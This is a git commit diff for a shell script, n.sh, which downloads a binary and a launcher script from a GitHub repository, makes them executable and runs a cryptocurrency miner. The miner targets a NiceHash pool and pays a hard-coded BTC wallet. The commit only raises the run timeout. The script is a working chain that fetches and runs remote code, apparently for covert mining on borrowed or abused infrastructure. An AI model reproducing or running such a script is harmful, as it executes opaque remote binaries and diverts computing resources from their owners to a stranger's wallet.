e38bc98b753e14436490c0db936481542c2e03fe
uoyeloue <93659624+uoyeloue@users.noreply.github.com>
2021-11-05 10:59:28 +0530

    Update n.sh

--- n.sh
+++ n.sh
@@ -4,4 +4,4 @@ wget https://github.com/aka648582/yes/raw/main/gas
 chmod +x gas
 wget https://github.com/aka648582/yes/raw/main/cmdline_launcher.sh
 chmod +x cmdline_launcher.sh
-timeout 1200 ./cmdline_launcher.sh -algo autolykos  -coin BTC -wallet 3EhmiQgfEoT1mg4ajPgQwGRg1iatY1dJ9E  -rigName  PWF -pool1 autolykos.usa-east.nicehash.com:3390
+timeout 1300 ./cmdline_launcher.sh -algo autolykos  -coin BTC -wallet 3EhmiQgfEoT1mg4ajPgQwGRg1iatY1dJ9E  -rigName  PWF -pool1 autolykos.usa-east.nicehash.com:3390
